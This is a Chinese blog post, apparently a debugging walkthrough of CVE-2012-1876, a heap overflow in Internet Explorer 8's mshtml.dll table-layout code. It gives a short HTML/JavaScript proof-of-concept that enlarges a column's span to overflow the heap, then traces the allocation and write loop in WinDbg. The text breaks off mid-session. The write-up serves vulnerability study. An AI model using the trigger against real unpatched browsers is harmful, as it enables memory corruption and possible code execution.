{"title":"CVE-2012-1876调试分析","slug":"CVE-2012-1876调试分析","date":"2019-07-10T12:19:25.000Z","updated":"2019-09-21T08:39:37.449Z","comments":true,"path":"api/articles/CVE-2012-1876调试分析.json","photos":[],"link":"","excerpt":"CVE-2012-18761. 漏洞简介一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当，那么就会触发堆溢出问题。其中mshtml.dll模块是IE中的重要组件，用来解析HTML和CSS。（微软官方说明https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）系统：Win7 Pro x86版本：IE8.0.7601.17514","covers":["http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png"],"content":"<h2 id=\"CVE-2012-1876\"><a href=\"#CVE-2012-1876\" class=\"headerlink\" title=\"CVE-2012-1876\"></a>CVE-2012-1876</h2><h3 id=\"1-漏洞简介\"><a href=\"#1-漏洞简介\" class=\"headerlink\" title=\"1. 漏洞简介\"></a>1. 漏洞简介</h3><p>一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当，那么就会触发堆溢出问题。</p>\n<p>其中mshtml.dll模块是IE中的重要组件，用来解析HTML和CSS。（微软官方说明<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)）</a></p>\n<p>系统：Win7 Pro x86</p>\n<p>版本：IE8.0.7601.17514</p>\n<a id=\"more\"></a>\n<h3 id=\"2-PoC\"><a href=\"#2-PoC\" class=\"headerlink\" title=\"2. PoC\"></a>2. PoC</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span> &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"6\"</span> &gt;</span>&amp;nbsp <span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    function over_trigger() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        var obj_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.width = \"42765\";</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.span = 666;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    setTimeout(\"over_trigger();\",1);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上述代码的功能十分清晰，最开始时span的属性值为6，而后通过js中的over_trigger函数将其动态更新为666，当然，更新后的值可以是任意的，只要能保证溢出就可以。另外，width的属性值和写入堆空间的内容有关。</p>\n<h3 id=\"3-调试\"><a href=\"#3-调试\" class=\"headerlink\" title=\"3. 调试\"></a>3. 调试</h3><p>强制下载符号表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:018&gt; .reload /f mshtml.dll</span><br></pre></td></tr></table></figure>\n<p>然后下以下断点：</p>\n<p>这里，由于错误定位是在CTableLayout::CalculateMinMax函数中，所以要下个断点；又因为是个堆溢出，所以HeapRealloc也要下断点；最后的CTableCol::GetAAspan断点是用来获取span属性的。</p>\n<p>首先禁用后两个断点，只停在CalculateMinMax处。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:013&gt; bl</span><br><span class=\"line\">0:013&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\">0:013&gt; bp mshtml!_HeapRealloc</span><br><span class=\"line\">0:013&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class=\"line\">0:013&gt; b l</span><br><span class=\"line\">0:013&gt; bd 1 2</span><br><span class=\"line\">0:013&gt; bl</span><br><span class=\"line\"> 0 e 67c7a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\"> 1 d 67d2d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc</span><br><span class=\"line\"> 2 d 67bfa6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan</span><br></pre></td></tr></table></figure>\n<p>g运行起来，并允许阻止的内容，终于成功断到了断点处。查看栈现场：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; kb 5</span><br><span class=\"line\">ChildEBP RetAddr  Args to Child              </span><br><span class=\"line\">024ec67c 6b68a6b8 006736f0 024ec910 00000000 mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\">024ec898 6b680879 024ec910 024ec8dc 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class=\"line\">024eca44 6b78566c 024ed960 024ecc70 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class=\"line\">024ecb7c 6b7818f9 006736f0 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class=\"line\">024ecc40 6b781646 006736f0 0002ddfc 0002ddfc mshtml!CFlowLayout::MeasureSite+0x312</span><br></pre></td></tr></table></figure>\n<p>函数的函数声明如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> __thiscall CTableLayout::CalculateMinMax(CTableLayout *__hidden <span class=\"keyword\">this</span>, struct CTableCalcInfo *, <span class=\"keyword\">int</span>)</span><br></pre></td></tr></table></figure>\n<p>我们主要关心函数的第一个参数，即类型为CTableLayout的指针，由上面的调用栈看出其地址为0x6736f0。ln指令查看就近的符号，poi(xxx)表示解引用。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; ln poi(0x6736f0)</span><br><span class=\"line\">(6b589960)   mshtml!CTableLayout::`vftable&apos;   |  (6b589aa0)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class=\"line\">Exact matches:</span><br><span class=\"line\">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 0x6736f0</span><br><span class=\"line\">006736f0  6b589960 006ba180 0069c1b8 6b73e3b8 # 其中0x6b589960是vtable值</span><br><span class=\"line\">00673700  00000001 00000000 0108080d ffffffff</span><br><span class=\"line\">00673710  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">00673720  0002ddfc 00015248 00000000 00000000</span><br><span class=\"line\">00673730  00000000 00412802 00000000 00000000</span><br><span class=\"line\">00673740  00000000 00000006 ffffffff ffffffff # 其中0x00000006是属性span的值</span><br><span class=\"line\">00673750  ffffffff ffffffff 6b58a594 00000004</span><br><span class=\"line\">00673760  00000004 00706338 6b58a594 00000018</span><br></pre></td></tr></table></figure>\n<p>然后继续调试，断在分配堆空间的函数_HeapRealloc。gu执行到函数返回，分配结束后查看。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 1 hit</span><br><span class=\"line\">eax=00000000 ebx=00000000 ecx=000000a8 edx=00000000 esi=0067378c edi=00673780 # 0xa8为分配的空间 0x67378c为申请的地址</span><br><span class=\"line\">eip=6b73d7a5 esp=024ec5b4 ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!_HeapRealloc:</span><br><span class=\"line\">6b73d7a5 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000000 ebx=00000000 ecx=77c05dd3 edx=006f179f esi=0067378c edi=00673780</span><br><span class=\"line\">eip=6b7534e2 esp=024ec5bc ebp=024ec5cc iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CImplAry::EnsureSizeWorker+0xa1:</span><br><span class=\"line\">6b7534e2 8bd8            mov     ebx,eax</span><br><span class=\"line\">0:005&gt; dd 0x6736f0 L30</span><br><span class=\"line\">006736f0  6b589960 006ba180 0069c1b8 6b73e3b8</span><br><span class=\"line\">00673700  00000001 00000000 0108080d ffffffff</span><br><span class=\"line\">00673710  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">00673720  0002ddfc 00015248 00000000 00000000</span><br><span class=\"line\">00673730  00000000 00412802 00000000 00000000</span><br><span class=\"line\">00673740  00000000 00000006 00000000 ffffffff</span><br><span class=\"line\">00673750  00000000 ffffffff 6b58a594 00000004</span><br><span class=\"line\">00673760  00000004 00706338 6b58a594 00000018</span><br><span class=\"line\">00673770  00000006 006af428 00000000 00000000</span><br><span class=\"line\">00673780  6b58a594 00000000 00000000 006f17a0 # 分配的地址为0x6f17a0</span><br><span class=\"line\">00673790  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006737a0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>\n<p>程序申请了堆空间用于保存column的样式信息，每个样式信息占0x1c字节，有多少个样式信息由span属性决定，因此申请0x1c*6 = 0xa8，即_HeapRealloc函数入口断下后ecx寄存器的值，函数调用时的入参如果用到寄存器的话一般都是ecx，返回参数在eax中。同时注意随后分配的初始地址会保存在esi寄存器对应的地址处，即0x6f17a0。</p>\n<p>继续运行程序会在CTableCol::GetAAspan处断下来，也就是获取span值作为写入样式信息时循环的控制次数，返回值保存在eax中，此处为6.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b60a6cb esp=024ec5d4 ebp=024ec67c iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6b60a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000006 ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b81f31f esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6b81f31f 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure>\n<p>然后在刚刚分配的地址处下条件断点（写入时断下），查看向申请的堆空间写入样式信息的过程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 3 hit</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8</span><br><span class=\"line\">eip=6b9b0a49 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x2f:</span><br><span class=\"line\">6b9b0a49 eb2a            jmp     mshtml!CTableColCalc::AdjustForCol+0x5b (6b9b0a75)</span><br><span class=\"line\">0:005&gt; ub</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x1c:</span><br><span class=\"line\">6b9b0a36 85c0            test    eax,eax</span><br><span class=\"line\">6b9b0a38 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (6b9b0a4b)</span><br><span class=\"line\">6b9b0a3a 6a08            push    8</span><br><span class=\"line\">6b9b0a3c 57              push    edi</span><br><span class=\"line\">6b9b0a3d 8bc3            mov     eax,ebx</span><br><span class=\"line\">6b9b0a3f e83dacbdff      call    mshtml!CUnitValue::SetValue (6b58b681)</span><br><span class=\"line\">6b9b0a44 895e04          mov     dword ptr [esi+4],ebx</span><br><span class=\"line\">6b9b0a47 891e            mov     dword ptr [esi],ebx</span><br><span class=\"line\">0:005&gt; dd 006f17a0 L30</span><br><span class=\"line\">006f17a0  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f17b0  00000000 00000000 00010048 00000000</span><br><span class=\"line\">006f17c0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17d0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17e0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f17f0  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1800  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1810  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1820  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1830  00000000 00000000 00000000 00000000</span><br><span class=\"line\">006f1840  00000000 00000000 3c73b87b 0800285c</span><br><span class=\"line\">006f1850  00689350 00689410 b67bb8f9 08002848</span><br></pre></td></tr></table></figure>\n<p>由poc看出width属性值为41，写入的为41*100=0x1004，事实上程序断下来的时候0x1c个字节的写入已经完成。然后一直单步跟：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=006f17b8</span><br><span class=\"line\">eip=6b9b0a75 esp=024ec5bc ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5b:</span><br><span class=\"line\">6b9b0a75 5f              pop     edi</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a76 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5c:</span><br><span class=\"line\">6b9b0a76 895e08          mov     dword ptr [esi+8],ebx ds:0023:006f17a8=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=00001004 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a79 esp=024ec5c0 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x5f:</span><br><span class=\"line\">6b9b0a79 5b              pop     ebx</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a7a esp=024ec5c4 ebp=024ec5c4 iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x60:</span><br><span class=\"line\">6b9b0a7a 5d              pop     ebp</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b9b0a7b esp=024ec5c8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableColCalc::AdjustForCol+0x61:</span><br><span class=\"line\">6b9b0a7b c20c00          ret     0Ch</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f47a esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x558:</span><br><span class=\"line\">6b81f47a ff45ec          inc     dword ptr [ebp-14h]  ss:0023:024ec668=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00010048 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f47d esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x55b:</span><br><span class=\"line\">6b81f47d 8b45ec          mov     eax,dword ptr [ebp-14h] ss:0023:024ec668=00000001</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f480 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x55e:</span><br><span class=\"line\">6b81f480 8345dc1c        add     dword ptr [ebp-24h],1Ch ss:0023:024ec658=00000000</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=006736f0 ecx=006f17b8 edx=00000010 esi=006f17a0 edi=00000001</span><br><span class=\"line\">eip=6b81f484 esp=024ec5d8 ebp=024ec67c iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x562:</span><br><span class=\"line\">6b81f484 3b4510          cmp     eax,dword ptr [ebp+10h] ss:0023:024ec68c=00000006</span><br></pre></td></tr></table></figure>\n<p>出现了inc+cmp指令序列，猜想这就是控制堆空间写入样式信息的循环了，这几条汇编的含义是ebp-14处的变量(计数器)每次+1，然后放到eax中，只要与ebp+10处的参数不相同（这里为span的数值），就继续循环。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; d ebp+0x10</span><br><span class=\"line\">024ec68c  00000006 00000000 006736f0 006736f0 # span为6</span><br><span class=\"line\">0:005&gt; d ebp-0x14</span><br><span class=\"line\">024ec668  00000001 00000000 00001004 00000000 # counter此时为1</span><br></pre></td></tr></table></figure>\n<p>然后看下通过js脚本动态更新span之后，程序第二次在CalculateMinMax入口断下时是什么情形，理论上需要重新分配堆空间，毕竟要多写入660个样式信息，而后再获取此时的span值作为循环控制次数，最后才向堆空间写入样式信息。</p>\n<p>第二次断在入口时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; bd 1 2 3</span><br><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 0 hit</span><br><span class=\"line\">eax=ffffffff ebx=006736f0 ecx=00402c02 edx=ffffffff esi=00000000 edi=024ec0f4</span><br><span class=\"line\">eip=6b68a078 esp=024ebe98 ebp=024ec0b0 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax:</span><br><span class=\"line\">6b68a078 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; dd 006f17a0 L30</span><br><span class=\"line\">006f17a0  00001004 00001004 00001004 00000000</span><br><span class=\"line\">006f17b0  00000000 00000000 00010048 00001004</span><br><span class=\"line\">006f17c0  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f17d0  00000000 00010048 00001004 00001004</span><br><span class=\"line\">006f17e0  00001004 00000000 00000000 00000000</span><br><span class=\"line\">006f17f0  00010048 00001004 00001004 00001004</span><br><span class=\"line\">006f1800  00000000 00000000 00000000 00010048</span><br><span class=\"line\">006f1810  00001004 00001004 00001004 00000000</span><br><span class=\"line\">006f1820  00000000 00000000 00010048 00001004</span><br><span class=\"line\">006f1830  00001004 00001004 00000000 00000000</span><br><span class=\"line\">006f1840  00000000 00010048 3c73b87b 0800285c</span><br><span class=\"line\">006f1850  00689350 00689410 b67bb8f9 08002848</span><br></pre></td></tr></table></figure>\n<p>确实写入了6个0x1c的样式信息。</p>\n<p>然后接下来要写入样式信息了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; be 1 2</span><br><span class=\"line\">0:005&gt; bl</span><br><span class=\"line\"> 0 e 6b68a078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class=\"line\"> 1 e 6b73d7a5     0001 (0001)  0:**** mshtml!_HeapRealloc</span><br><span class=\"line\"> 2 e 6b60a6cb     0001 (0001)  0:**** mshtml!CTableCol::GetAAspan</span><br><span class=\"line\"> 3 d 006f17a0 w 1 0001 (0001)  0:**** </span><br><span class=\"line\">0:005&gt; g</span><br><span 